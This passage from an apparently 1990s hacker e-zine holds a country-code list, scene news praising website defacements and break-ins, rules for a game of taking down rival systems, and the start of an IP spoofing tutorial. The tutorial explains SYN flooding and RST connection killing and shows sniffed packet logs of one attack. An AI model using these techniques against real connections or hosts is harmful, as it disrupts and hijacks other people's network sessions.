CI - Cote d'Ivoire
CK - Cook Islands
CL - Chile
CM - Cameroon
CN - China
CO - Colombia
CR - Costa Rica
CS - Czechoslovakia
CU - Cuba
CV - Cape Verde - Cabo Verde
CX - Christmas Island (Australia)
CY - Cyprus
CZ - Czech Republic - Cechy
DD - Germany - Deutschland
DE - Germany - Deutschland
DJ - Djibouti
DK - Denmark - Danmark
DM - Dominica
DO - Dominican Republic - Republica Dominicana
DZ - Algeria - Jaza'ir
EC - Ecuador
EE - Estonia - Eesti
EG - Egypt - Misr
EH - Western Sahara
ER - Eritrea
ES - Spain - Espana
ET - Ethiopia - Ityop'iya
FI - Finland - Suomi
FJ - Fiji
FK - Falkland Islands
FM - Micronesia
FO - Faroe Islands - Faroyar
FR - France
FX - Metropolitan France
GA - Gabon
GB - United Kingdom
GD - Grenada
GE - Georgia - Sak'art'velo
GF - French Guiana - Guyane
GH - Ghana
GI - Gibraltar (UK)
GL - Greenland - Kalaallit Nunaat
GM - The Gambia
GN - Guinea - Guinee
GP - Guadaloupe (France)
GQ - Equatorial Guinea - Guinea Ecuatorial
GR - Greece - Ellas
GS - South Georgia
GT - Guatemala
GU - Guam
GW - Guinea-Bissau - Guine-Bissau
GY - Guyana
HK - Hong Kong (UK)
HM - Heard Island and McDonald Islands (Australia)
HN - Honduras
HR - Croatia - Hrvatska
HT - Haiti
HU - Hungary - Magyarorszag
ID - Indonesia
IE - Ireland - &Eacute;ire
IL - Israel - Yisra'el
IN - India - Bharat
IO - Indian Ocean Territory (UK)
IQ - Iraq
IR - Iran
IS - Island - Iceland
IT - Italy - Italia
JM - Jamaica
JO - Jordan - Urdun
JP - Japan
KE - Kenya
KG - Kyrgyzstan
KH - Cambodia - Kampuchea
KI - Kiribati
KM - Comoros - Comores
KN - Saint Kitts and Nevis
KP - Korea - Choson
KR - Korea
KW - Kuwait - Kuwayt
KY - Cayman Islands
KZ - Kazakhstan
LA - Laos
LB - Lebanon - Lubnaniyah
LC - Saint Lucia
LI - Liechtenstein
LK - Sri Lanka
LR - Liberia
LS - Lesotho
LT - Lithuania - Lietuva
LU - Luxembourg
LV - Latvia - Latvija
LY - Libya - Libiya
MA - Morocco - Maghrib
MC - Monaca
MD - Moldova
MG - Madagascar
MH - Marshall Islands
MK - Macedonia - Makedonija
ML - Mali
MM - Burma - Myanma
MN - Mongolia - Mongol Uls
MO - Macau
MP - Northern Mariana Islands
MQ - Martinique (France)
MR - Mauritania - Muritaniyah
MS - Montserrat
MT - Malta
MU - Mauritius
MV - Maldives
MW - Malawi
MY - Malaysia
MZ - Mozambique - Mocambique
NA - Namibia
NC - New Caledonia - Nouvelle-Caledonie
NE - Niger
NF - Norfolk Island (Australia)
NG - Nigeria
NI - Nicaragua
NL - Netherlands - Nederland
NO - Norway - Norge
NP - Nepal
NR - Nauru
NU - Niue
NZ - New Zealand
OM - Oman - Uman
PA - Panama
PE - Peru
PF - French Polynesia - Polynesie Francaise
PG - Papua New Guinea
PH - Philippines - Pilipinas
PK - Pakistan
PL - Poland - Polska
PM - Saint-Pierre et Miquelon
PN - Pitcairn Islands
PR - Puerto Rico
PT - Portugal
PW - Palau - Belau
PY - Paraguay
QA - Qatar
RE - Reunion
RO - Romania
RU - Russia - Rossiya
RW - Rwanda
SA - Saudi Arabia - Arabiya as Suudiyah
SB - Solomon Islands
SC - Seychelles
SD - Sudan
SE - Sweden - Sverige
SG - Singapore - Singapura
SH - Saint Helena (UK)
SI - Slovenia - Slovenija
SJ - Svalbard og Jan Mayen
SK - Slovakia - Slovensko
SL - Sierra Leone
SM - San Marino
SN - Senegal
SO - Somalia
SR - Suriname
ST - Sao Tome e Principe
SU - Soviet Union - Sovietskiy Soyuz
SV - El Salvador
SY - Syria - Suriyah
SZ - Swaziland
TC - Turks and Caicos Islands
TD - Chad - Tchad
TF - Southern and Antarctic Lands - Terre Australes et Antarctiques
TG - Togo
TH - Thailand
TJ - Tajikistan - Tojikiston
TK - Tokelau (New Zealand)
TM - Turkmenistan - Tiurkmenostan
TN - Tunisia - Tunis
TO - Tonga
TP - Timor
TR - Turkey - Turkiye
TT - Trinidad and Tobago
TV - Tuvalu
TW - Taiwan - T'ai-wan
TZ - Tanzania
UA - Ukraine - Ukrayina
UG - Uganda
UM - United States Minor Outlying Islands
US - United States of America
UY - Uruguay
UZ - Uzbekistan - Uzbekiston
VA - Holy See
VC - Saint Vincent and the Grenadines
VE - Venezuela
VG - Virgin Islands (UK)
VI - Virgin Islands (USA)
VN - Vietnam - Viet Nam
VU - Vanuatu
WF - Wallis et Futuna
WS - Samoa
YD - Yemen
YE - Yemen
YT - Mayotte (France)
YU - Yugoslavia
ZA - South Africa
ZM - Zambia
ZR - Zaire
ZW - Zimbabwe

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ NEWS ]=====================[ .SECTION E. ]=======================[ NEWS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. CoreWars : so1o / od|phreak
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
od|phreak was telling me about an idea he had, then called just "Hacker Wars"
it was about teams, or groups of hackers who had a league system and hacked
each others systems to gain points...

We both made sets of rules and decided on a name also, CoreWars...Here are the
rules as to date :

-  6 hackers per team.
-  Each team has 2 systems.
-  The systems must run linux, and be up 24/7.
-  The game is played from a friday at
   midnight to a sunday at midnight (48 hours).

-  On systems owned by the team, each user may have one
   account, with any systems priveleges.

-  Each team has 1 account on each enemy system

   - 2.5mb quota per account
   - must be a normal user

Rules :
-------

   - super users on opposing teams are NOT allowed to
     intervine with other hackers, this includes killing,
     writing to their terminals, or disturbing them in
     any way shape or form, however, super users are
     allowed to use snoop and other programs to monitor
     opposing team members, but they cannot DIRECTLY
     step in and kill the user. super users CANNOT delete
     files created by the opposing team members, however
     they ARE allowed to delete files if they have been 
     MODIFIED, like /etc/motd.

   - teams conquer a system by forcing it to be shut down,
     switched off, or any other measure that prevents
     persons from connecting or using that system. This
     can include rm'ng the hard drive or any other suitable
     measure.

The Winning Team Is The Last Team With A System That
Has Not Been Shut Down.

if you shut a system down             :  100 points
if your system gets shut down         :  -50 points 
if you keep both of your systems up   :   25 points
if you lose both of your systems      :  -25 points

On Sunday midnight, all points are worked out, and
the league positions are calculated.

These Rules Are Currently Being Changed : http://www.neonunix.org/corewars/
Suggestions to myself or od|phreak...

So, if you have a team of 6 that you would like to enter in CoreWars, mail
corewars@<codezero's new domain that's not yet decided here> with your team
name, details, system IP and other relevant information...
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Technophoria Want A Piece Of CodeZero Too? : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Technophoria, based at www.technophoria.com, did *NOT* hack our webpage at
www.neonunix.org/codezero/ as i dont even have a l/p to neonunix.org, anyway,
they uploaded this shiznit to the page, obviously with neonunix's account,
which is the only one on the system...

Dont talk shit about Technophoria<br><br><br>-Particle Man<br><Br>
<embed src="particle.wav"loop=true> <meta refresh="http://www.technophoria.com">

Hmmm, who the fuck is Particle Man?! last time I checked the Technophoria member
list it had...

Deprave
BroncBuster
Sludge
Acid Angel
Modify
The Messiah
Banshee

Now, I dont get on well with Modify or The Messiah (who are in like, 3 other
groups each) but Deprave is a good friend, Sludge and Acid I have never met
and Bronc is cool. I dont know whats goin down wit that shit, but the last
thing I need is some punk trying to say that I write shit about Technophoria,
seeing I have never written a thing about them, but anyway, if you do visit
the Technophoria WWW site, you will see that sIn and Technophoria are working
on the same project with the same people, Utopia (mentioned in the last issue
by *ODÝPHREAK*) I wonder who will take the credit and / or release the actual
program, hmm..I talked to The Messiah...

<TheMessiah> Utopia will be a encryption utility, release by 
  SIN/Technophoria, written by The Messiah and Fucking Hostile.
<TheMessiah> No release date is given.
<so1o> encryption util?
<so1o> for what purposes?
<TheMessiah> Encrypting files, clipboard, and an editor, like Puffer.
<so1o> thru windoze?
<TheMessiah> Yes.
<so1o> ahh
<TheMessiah> 16 bit.
<TheMessiah> With plans for a 32 bit version.
<so1o> because doesnt pgp do that and alot more?
<TheMessiah> No, it doesn't.
<so1o> what kind of encryption are we talking about?
<TheMessiah> PGP only uses ONE algorithm, IDEA.
<TheMessiah> About 16 different algorithms.
<so1o> and yours will use?
<TheMessiah> RC4, RC5, IDEA, Blowfish, DES, SuperIDEA...
<TheMessiah> I'm still looking into that...
<so1o> isnt that just ripping other peoples shit?
<so1o> blatently
<TheMessiah> No.
<TheMessiah> If so then PGP is ripping.
<TheMessiah> Puffer is ripping.
<TheMessiah> The source for almost all algorihtms is released.
<TheMessiah> So ppl can evaluate it..
<so1o> what about RC5 source then?
<TheMessiah> Have it.
<so1o> okay...
<so1o> so you have all your algorithms
<TheMessiah> RSA condones non-commercial use of RC4 and RC5.
<TheMessiah> Pretty much.
<so1o> but how will the program work then?
<TheMessiah> Right now I'm wondering which algorihtms to put into it.
<so1o> will it have secret keys and public keys like pgp
<so1o> ?
<TheMessiah> You select an algorihtm, files, and hit encrypt...
<TheMessiah> No, symetric key encryption.
<TheMessiah> One password...
<so1o> isnt that a bit unsecure?
<TheMessiah> I'm making a public key encryption program later on...
<TheMessiah> No, it isn't.
<so1o> seeing then the password will have to be given to the other user
<so1o> over a medium such as IRC
<TheMessiah> You can't transmit keys, true...
<so1o> which can be logged
<TheMessiah> But this isn't for communication as much as file storgae...
<TheMessiah> People can use PGP to transmit keys...
<so1o> so what will the program include?
<TheMessiah> Hmmm... what won't it?
<TheMessiah> I'm hoping to include some steganography in it...
<TheMessiah> It'll be something like Puffer, only WAY better...
<so1o> okzy
<so1o> 1st release will be 16-bit
<so1o> right?
<TheMessiah> Yes...
<so1o> will it have any problems running thru 95 / NT
<so1o> ?
<TheMessiah> Nope.
<TheMessiah> I'm using Win95...
<so1o> will users need .dll files to run it?
<TheMessiah> One.
<TheMessiah> But that'll come included...
<TheMessiah> No VB bullshit...
<TheMessiah> It's made in Delphi, so the runtime library is in the EXE...
<so1o> delphi
<so1o> i code borland c++
<TheMessiah> Get C++ Builder then...
<so1o> i plan on doing so
<TheMessiah> Like Delphi, but uses C++...
<so1o> okie, l8r
<TheMessiah> cya
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Global kOS News And Questions / Answers : Spidey
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
There have been several rumors circulating about what happened to us since
globalkos.org went down.  They range from us being busted by feds to
stories about purple shrouds and phenobarbital.  There have also been
rumors about dissention among our ranks and group infighting.

Q:  What happened to globalkos.org?  Did the feds shut it down?  Did their
    ISP shut it down?  Did they move their site to keep it hidden?
A:  Half of us didn't feel like paying for it.  We weren't shut down, nor
    is the site hidden out there somewhere.  We're looking into alternatives.

Q:  Did Acid Angel leave GkOS for Technophoria?
A:  No.  He is working with the guys at Technophoria, but he is still a part
    of Global kOS.

Q:  Did Silicon Toad leave the group altogether?
A:  Somebody came up with this one on the basis of a broken link at
    globalkos.org.  ST moved his site, and no one bothered to update the link.
    Through some stretch of logic this guy decided it meant ST split.

Q:  What about Up Yours 4?
A:  It's slated for release on March 30th.

Q:  Did GkOS get busted?
A:  No.

Q:  I thought Cobra (Vortex, Morbid Disorder, Kludge, or Ryan) was a member of
    GkOS.
A:  I've never even heard of these people. They are not present,  nor
    former members.

 Our members are:

  Acid Angel
  Glitch
  Materva
  Raven
  Shadow Hunter
  Silicon Toad
  Spidey
  That Guy
  Zaven

Q:  I heard there was a major disagreement within the group, and there's a
    civil war going on between them. Is it true?
A:  No.  This is completely unfounded.  Whoever started this one pulled it
    straight out of his ass.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. www.ncaa.com Hack Makes News : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Conflict member TiK hacked www.ncaa.com, he made TV news, papers, and big
internet news, statements from the NCAA and other organisations can be found
on www.infowar.com, so1o never believed TiK would or could hack such a site
due to the high security levels, but good 'ole TiK proved us all wrong, expect
the index.html s00n!
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. CodeZero To Release sunOS 5.x RootKit : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Yeah, werkin' on it, lewkout!!
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  6. Too Many nethosting.com Break-Ins : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
www.hawkee.com and many other "vservers" at nethosting.com have been hacked
or attacked, like sinnerz.com (although no damage was done to the site) and
so the admin at nethosting can't be very happy with their security, I was
talking to hawkee about the hacks into his system by two members of the
CodeZero (thats what the numbers stood for - minus 2 from each, turn the 0
into a 26, then 1 = A, 2 = B, 3 = C etc. = CODEZERO) and he was saying that
newhosting had really boosted their secruity, this was also the case when
access to cough-syrup.nethosting.com was gained by one single hacker, as after
the attack, the sendmail version was pumped from 8.8.4 to 8.8.5, nethosting are
also considering taking action to prevent certain hosts from having access to
the system.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  7. sulfur of #hack to print a bi-monthly magazine : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
Access Denied will be printed by sulfur (Edward Givings) of #hack, free copies
will be distributed at Beyond Hope, it will be bi-monthly, so you get 6 issues a
year, as opposed to 4 of 2600, look out for it...
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  8. 2600 printers go bust and take $9000 : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
The latest news is that the 2600 printers have gone bust, and taken $9000 of
the 2600's money with them, Winter edition of 2600 might not come out.
emmilio can't be very happy can he?
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ PROJECTS ]=================[ .SECTION F. ]===================[ PROJECTS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

         .:. The CodeZero In Assosiation With Dr_Sp00f Presents .:.
         .:.        A Confidence Remains High Production        .:.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

      -=[ A short (yea right - T_K) overview of IP spoofing: PART I ]=-
                   -=[ Part of Dr_sp00f's Packet Project']=-
                                                  
            (Includes Source for Linux 1.3.X and later kernels)
    All text and Source code written by Dr_Sp00f himself (Copyright 1997)
                 All source tested on Linux kernel 2.0.X  
   All packet data captured with Sniffit 0.3.2 (a pre-release at that time)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

PART I: Simple spoofing (Non blind)
-----------------------------------

0. Introduction 	
0.1 What
0.2 For whom
0.3 Disclaimer
0.4 Licence

1. Short explanation of some words 
2. Description of sourcecode
2.1 Source included
2.2 Programmer notes

3. TCP/IP (UDP) in an hazelnutshell

4. Non-blind spoofing
4.1 Know what you are doing
4.2 SYN flooding
4.3 Connection Killing 
4.3.1 Using reset (RST)
4.3.2 Closing a connection (FIN)
4.3.3 Improving
4.4 Connection Hijacking
4.5 Other

5. The source code

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                    PART I: Simple spoofing (Non blind)
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

0. Introduction
---------------

0.1 What
--------

This document describes some IP spoofing attacks and gives you example 
source code of the programs used for these attacks (and packet sniffer 
logs, so you see what exactly happens).
It also provides you with an easy to use include file for experimenting a 
little yourself.
Oh, if you make something nice with the "spoofit.h" file, please mail it to me
(or a reference where it is available) with a little explanation on what it
is (a few lines are enough)...

If you have interesting remarks, comment, idea's, ... please contact me
                            Dr_spoof@geocities.com 

If YOU think of yourself, you are "3><Tr3/\/\3lY 3Le3T", please don't bother 
contacting me. 
Flames >/dev/null or >/dev/echo depends on how smart you are.

It is not wise to use what you don't know/understand, so read this before 
trying anything... it will only take a few minutes, and probably save you 
some hours of failure...

This code is not crippled in the usual way (removing some vital parts), 
the power is limited by it's briefness, because I wanted to keep 
everything simple and illustrative (but working). It's a simple job to 
improve it, and that is the goal of this doc, that you improve it yourself.

Special thx to |ExcEEd| and theJUdgE also to all those ppl who deserve
it.

0.2 For whom
------------

For people with an elementary knowledge of TCP/IP, some knowledge on C (only 
the basic setup) and some general UNIX knowledge.
It's no use reading this document if you are completely unaware of these 
things, but mind you, only a little knowledge is enough.

0.3 Disclaimer
--------------

I am in no way responsible for the use of this code. By using this 
software and reading this document you accept the fact that any damage 
(emotional, physical, dataloss and the end of the world as we know it ...) 
caused by the use or storage of these programs/documents is not MY 
responsability.

I state that during the writing and testing of this document/source, I 
never violated any law. All spoofing was done between machines where I had 
legit root access, or where I had the permission from the legit root.

This code can be written by any competent programmer, so this source is 
not so harmfull as some will say (cauz' I'm sure some people won't like 
this degree of disclosure).

0.4 Licence
-----------

All source code and text is freely available. You can spread it, as long 
as you don't charge for it (exceptions are a small reproduction fee, if 
it isn't spread together with commercial software, texts.)
You may not spread parts of the document, it should be spread as one 
package. You may not modify the text and/or source code. 

You can use the spoofit.h or derived code in your own programs as long as 
they are not commercial (i.e. FREE), and you give me the credits for it.


1. Short explanation of some words 
----------------------------------

This is a short explanation of some words you might see in the 
text/source. You probably know all this, but I put it in here anyway.

Sniffit
  My favourite Packet Sniffer, all sniffed sequences in this 
  (At time of writing a pre-release 0.3.2)

IP-spoofing (further referenced to as spoofing)
  The forging of IP packets 
  NOTE that not only IP based protocols are spoofed.
  NOTE that spoofing is also used on a constructive base (LAN spoofing, 
       not discussed here).
  NOTE that I don't use it on a constructive base ;)

Non-blind spoofing
  Using the spoofing to interfer with a connection that sends packets 
  along your subnet (so generally one of the 2 hosts involved is located 
  on your subnet, or all data traffic has to be passing your network 
  device,... you might consider taking a job at some transatlantic route 
  provider).

Blind spoofing
  Using the spoofing to interfer with a connection (or creating one), 
  that does not send packets along your cable. 


2. Description of sourcecode
----------------------------

2.1 Source included
-------------------
spoofit.h
  The include file that provides some easy to use spoofing functions.
  To understand the include file and it's functions, read the header of 
  that file for use of the C functions.

*.c
  Example programs (on the use of spoofit.h) that are discussed in this 
  document.
  Details on these programs are included in the appropriate sections.

sniper-rst.c
  Basic TCP connection killer.
  (denial-of-services)

sniper-fin.c
  Basic TCP connection killer.
  (denial-of-services)

hijack.c
  Simple automated telnet connection hijacker.

2.2 Programmer notes
--------------------

These programs are just examples. That means, they could be improved a 
lot. Because I wanted to keep them short and leave some stuff to your 
imagination, they are very simple.
However they all work and are a good starting point.


3. TCP/IP (UDP) in an hazelnutshell
-----------------------------------

Because it has been explained enough in 'Phrack Volume Seven, Issue 
Forty-Eight, File 14 of 18' by daemon9/route/infinity , and there is a lot of 
documentation available on the subject I will only repeat some things 
very briefly. (Please read the phrack #48 file or any other document on 
the subject before reading this).

A connection is fully defined with 4 parameters, a source host and port, 
and a destination host and port.

When you make a connection, data is send in packets. Packets take care of 
low level trafic, and make sure the data arrives (sometimes with special 
error handling). The spine of most networks is the IP protocol version 4. 
It is totally independent of all hardware protocols.

TCP and UDP are higher level protocols wrapped up in IP packets.

All those packets consist of a header and data.

IP header contains (amongst other things): IP of source and destination 
hosts for that packet, and the protocol type of the packet wrapped up in 
it. (TCP=6, UDP=17, etc.).

UDP packets contain (amongst other things): port number of source and 
destination host. UDP has no such thing as SEQ/ACK, it is a very weak 
protocol.

TCP packets contain (amongst other things): port number of source and 
destination host, sequence and acknowledge numbers (further refered to as 
SEQ/ACK), and a bunch of flags.
SEQ number: is counted byte per byte, and gives you the number of the 
            NEXT byte to be send, or that is send in this packet.
ACK number: is the SEQ number that is expected from the other host.
SEQ numbers are chosen at connection initiation.

I said is was going to be short... If you didn't understand the above 
text, read up on it first, because you won't understand sh!t of the rest.


4. Non-blind spoofing
---------------------

4.1 Know what you are doing
---------------------------

The concept of non-blind spoofing (NBS further in this doc) is pretty 
simple. Because packets travel within your reach, you can get the current 
sequence and acknowledge (SEQ/ACK further in this doc) numbers on the 
connection. 
NBS is thus a very easy and accurate method of attack, but limited to 
connections going over your subnet. 
In spoofing documentation these attacks are sometimes ommited, because 
they are mostly 'denial-of-service' attacks, or because people don't 
realise the advantage a spoof (in particulary a hijack) can have above 
simple password sniffing.

Spoofing in generally is refered to as a verry high level of attack. This 
refers to blind spoofing (BlS further in this doc), because NBS is 
kidstuff for a competent coder.

4.2 SYN flooding
----------------

Thoroughly discussed in 'Phrack Volume Seven, Issue Forty-Eight, File 13 of 
18'. I won't waste much time on it.

Setup:
          host A <-----][----------X--------------->host B
                                   | 
          host S <-----------------/   

Concept:
Host S impersonates SYN (connection init) coming from host A, to host B. 
Host A should be unreachable (e.g. turned off, non existant,...).
B sends out the second packet of the 3 way TCP handshake. Host B will now 
wait for response of host A.
If host A is reachable it will tell host B (with a reset: RST) that it DID NOT 
inititate a connection, and thus host B received a bogus packet. (In that case
host B will ingnore the SYN, and *normally* nothing will happen)
So if A is unreachable, B will wait for response some time.
When doing multiple attacks, the backlog of host B is going to be exceeded 
and host B will not except new connections (read on TCP bugs for 
additional features ;) for some time.

4.3 Connection Killing
----------------------

Setup:
          host A <------X------------------------->host B
                        |      A,B have a TCP connection running
          host S <------/      A,S on same subnet

          (setup is the same in both cases)

Use:
Clearing mudders of your net, annoying that dude typing an important 
paper, etc... plain fun.

4.3.1 Using reset (RST)
-----------------------

Concept:
TCP packets have flags which indicate the status of the packet, like RST. 
That is a flag used to reset a connection. To be accepted, only the 
sequence number has to be correct (there is no ACK in a RST packet).
So we are going to wait for packets in a connection between A and B. 
Assume we wait for packets to A. We will calculate (from B's packets)
the sequence number for A's packets (from B's ACK's), and fire a bogus RST 
packet from S (faking to be A) to B.

An actual attack:
(These are real sniffed packets, although IP numbers of hosts were changed)
host A : 166.66.66.1
host B : 111.11.11.11
(S on same subnet as A)

(This is a good example of how things not always go as you want, see 
below for a solution) 
1) connection running...
   we wait for a packet to get current SEQ/ACK (A->B)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1810-111.11.11.11.23
   SEQ (hex): 57E1F2A6   ACK (hex): B8BD7679
   FLAGS: -AP---   Window: 3400
   (data removed because irrelevant, 2 bytes data)

2) This is the ACK of it + included data (witch causes SEQ number to 
   change, and thus messing up our scheme, because this came very fast.)
   (B->A) 

TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
   SEQ (hex): B8BD7679   ACK (hex): 57E1F2A8
   FLAGS: -AP---   Window: 2238
   (data removed because irrelevant, 2 bytes data)

3) ACK of it. (A->B) 

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1810-111.11.11.11.23
   SEQ (hex): 57E1F2A8   ACK (hex): B8BD767B
   FLAGS: -A----   Window: 3400
   (data removed because irrelevant)

4) further data (B->A)

TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
   SEQ (hex): B8BD767B   ACK (hex): 57E1F2A8
   FLAGS: -AP---   Window: 2238
   (data removed because irrelevant)

5) ACK of it (A->B)

TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1810-111.11.11.11.23
   SEQ (hex): 57E1F2A8   ACK (hex): B8BD7691
   FLAGS: -A----   Window: 3400

6) Now we get 2 RST packets. How do you explain that? Well, the first reset 
   packet has been buffered somewhere on our system, because the ethernet 
   segment was busy when we wanted to send it. This is the 'unexpected 
   thing' I discussed above, here we are lucky, the data stream cooled down 
   so fast.
   When it doesn't cool down so fast, we could miss our RST (or the 
   connection will be killed a little later then when we wanted), you'll see 
   some idea's on how to fix that problem.

TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
   SEQ (hex): B8BD7679      FLAGS: ---R--


TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
   SEQ (hex): B8BD7691      FLAGS: ---R--
   (This was the packet that killed the connection)

Discussion of the program:

The discussion here is a bit weird , that is because 'sniper-rst.c' is 
not designed to be an optimal killer, merly to be an example.
We have the problem of speed here. We miss some packets what causes those 
resends. So we would design a better 'sniper' if we do the following:
